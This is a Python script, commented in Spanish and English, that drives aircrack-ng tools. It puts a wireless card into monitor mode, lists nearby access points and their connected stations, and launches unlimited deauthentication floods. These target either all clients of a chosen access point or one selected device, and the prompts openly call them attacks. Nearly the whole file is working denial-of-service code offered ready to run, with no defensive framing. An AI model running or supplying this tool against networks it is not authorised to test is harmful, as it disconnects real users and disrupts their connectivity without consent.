import colorama, tabulate, random
from colorama import Fore, Style
import netifaces
import subprocess
import time
import os
import csv
from datetime import datetime
import shutil

def check_for_essid(essid, lst):
    check_status = True
 
    if len(lst) == 0:
        return check_status

    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status


def verificar_permisos_sudo():
    try:
        resultado = subprocess.run("sudo -n true", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return True  
    except subprocess.CalledProcessError as e:
        return False 
    

def listar_interfaces_disponibles():
    interfaces = netifaces.interfaces()
    print("Interfaces de red disponibles:")
    for i, interfaz in enumerate(interfaces, start=1):
        print(f"{i}. {interfaz}")
    
    while True:
        try:
            seleccion = int(input("Seleccione el número de la interfaz que desee (1, 2, ...): "))
            if 1 <= seleccion <= len(interfaces):
                return interfaces[seleccion - 1]
            else:
                print("Selección no válida. Por favor, ingrese un número válido.")
        except ValueError:
            print("Entrada no válida. Por favor, ingrese un número.")
            
            
def guardar_backup():
    for file_name in os.listdir():
        if ".csv" in file_name:
            directory = os.getcwd()
            try:
                os.mkdir(directory + "/backup/")
            except:
                pass
            
            timestamp = datetime.now()
            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)
    return


def get_random_color():
    return random.choice([Fore.BLACK, Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN])

def print_wireless_networks(wireless_networks):
    headers = ["No", "BSSID", "Channel", "ESSID"]
    table = []
    for index, item in enumerate(wireless_networks):
        color = get_random_color()
        table.append([color +str(index), color +item["BSSID"], color +item["channel"].strip(), color + item["ESSID"] + Style.RESET_ALL])

    print(tabulate.tabulate(table, headers=headers, tablefmt="pipe"))
    
def print_stations(stations):
    headers = ["No", "Station MAC", "Power", "BSSID"]
    table = []
    for index, item in enumerate(stations):
        color = get_random_color()
        table.append([color +str(index), color +item["Station_MAC"], color +item["Power"].strip(), color + item["BSSID"] + Style.RESET_ALL])

    print(tabulate.tabulate(table, headers=headers, tablefmt="pipe"))

    

def main():
    
    if not(verificar_permisos_sudo()):
        print("Necesitas permisos de sudo para usar este script.")
        return 0
    
    active_wireless_networks = []
    active_stations = []
    
    guardar_backup()
    
    
    nombre_interfaz = listar_interfaces_disponibles()
    print(f"Ha seleccionado la interfaz: {nombre_interfaz}")
    print(f"\n Eliminamos todos los procesos relacionados con {nombre_interfaz}")
    
    subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["airmon-ng", "start", nombre_interfaz], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["iwconfig"])
    
    discover_access_points = subprocess.Popen(["airodump-ng","-w" ,"bssid","--write-interval", "1","--output-format", "csv", nombre_interfaz+"mon"], stdout=subprocess.DEVNULL)
    try:
        while True:
            subprocess.call("clear", shell=True)
            for file_name in os.listdir():
                    fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                    if ".csv" in file_name:
                        with open(file_name) as csv_h:
                            # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above. 
                            # This creates a list of dictionaries with the keys as specified in the fieldnames.
                            csv_h.seek(0)
                            csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                            for row in csv_reader:
                                if row["BSSID"] == "BSSID":
                                    pass
                                elif row["BSSID"] == "Station MAC":
                                    break
                                elif check_for_essid(row["ESSID"], active_wireless_networks):
                                    active_wireless_networks.append(row)

            print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
            print_wireless_networks(active_wireless_networks)   
            
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nReady to make choice.")

    # Ensure that the input choice is valid.
    while True:
        choice = input("Please select a choice from above: ")
        try:
            if active_wireless_networks[int(choice)]:
                break
        except:
            print("Please try again.")

    # To make it easier to work with we assign the results to variables.
    hackbssid = active_wireless_networks[int(choice)]["BSSID"]
    hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
    ap = active_wireless_networks[int(choice)]["ESSID"] 
    
    

    # Change to the channel we want to perform the DOS attack on. 
    # Monitoring takes place on a different channel and we need to set it to that channel. 
    subprocess.run(["sudo", "iwconfig", nombre_interfaz +"mon" , "channel", hackchannel])
    
    while True:
        subprocess.call("clear", shell=True)
        print(f"Selecionaste la wlan: \n MAC: {hackbssid} \n CHANNEL: {hackchannel} \n AP: {ap} \n")
        print("Selecciona el ataque que quieres llevar a cabo:")
        print("1. La estación (STA) envía un paquete de deauth hacia el punto de acceso (AP)")
        print("2. El AP envía paquetes de deauth a todas las STAs conectadas")
        print("3. Exit")
        guardar_backup()
        
        while True:
            opcion = input("Ingresa el número de la opción que deseas (1/2/3): ")

            if opcion == '2':
                print("Has seleccionado la Opción 2.")
                
                subprocess.Popen(["aireplay-ng", "-0", "0", "-a", hackbssid, nombre_interfaz + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 

                
                try:
                    while True:
                        print("Deauthenticating clients, press ctrl-c to stop")
                        time.sleep(2)
                except KeyboardInterrupt:
                    break  
                
            elif opcion == '1':
                print("Escaneando estaciones ...")
                
                discover_stations = subprocess.Popen([ "airodump-ng","-w" ,"stations","--write-interval", "1","--output-format", "csv", "--bssid", hackbssid, "--channel", hackchannel ,nombre_interfaz+"mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                try:
                    while True:
                        # We want to clear the screen before we print the network interfaces.
                        subprocess.call("clear", shell=True)
                        for file_name in os.listdir():
                                # We should only have one csv file as we backup all previous csv files from the folder every time we run the program. 
                                # The following list contains the field names for the csv entries.
                                fieldnames = ['Station_MAC', 'First_time_seen', 'Last_time_seen', 'Power', '#_packets', 'BSSID', 'Probed_ESSIDs']
                                if "stations" in file_name:
                                    active_stations = []
                                    with open(file_name) as csv_h:
                                        # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above. 
                                        # This creates a list of dictionaries with the keys as specified in the fieldnames.
                                        csv_h.seek(0)
                                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                                        indice = 0
                                        for row in csv_reader:
                                            if row["Station_MAC"] == "Station MAC":
                                                indice = 1
                                                pass
                                            elif indice == 1 and len(row["Station_MAC"]) > 0 : 
                                                
                                                active_stations.append(row)
                                            elif indice == 1 and len(row["Station_MAC"]) == 0 :
                                                break


                        if (len(active_stations) > 0 ):

                            print("Scanning. Press Ctrl+C when you want to select which station you want to attack.\n")
                            print_stations(active_stations)
                            time.sleep(1)
                        
                        else:
                            print("No se encuentra ningun dispositivo conectado")
                            time.sleep(1)

                except KeyboardInterrupt:
                    if (len(active_stations) == 0 ):
                        break
                    print("\nReady to make choice.")

                # Ensure that the input choice is valid.
                while True:
                    choice = input("Please select a choice from above: ")
                    try:
                        if active_stations[int(choice)]:
                            break
                    except:
                        print("Please try again.")
                        
                            
                hack_station = active_stations[int(choice)]["Station_MAC"]
                
                
                subprocess.Popen(["sudo","aireplay-ng", "-0", "0" , "-a", hackbssid, "-c", hack_station , nombre_interfaz + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
                try:
                    while True:
                        print(f"Deauthenticating {hack_station}, press ctrl-c to stop")
                        time.sleep(2)
                except KeyboardInterrupt:
                    break  
                
                   
               
               
            elif opcion == '3':
                print("Has seleccionado la Opción 3.")
                break  

            else:
                print("Opción no válida. Por favor, elige una opción válida (1/2/3/4).")
        
        if opcion == '3':
            break      



    print("Stop monitoring mode")
    
    subprocess.run(["airmon-ng", "stop", nombre_interfaz+"mon"])
    subprocess.run(["systemctl", "start", "NetworkManager"])
    print("Thank you! Exiting now")

        

if __name__ == "__main__":
    main()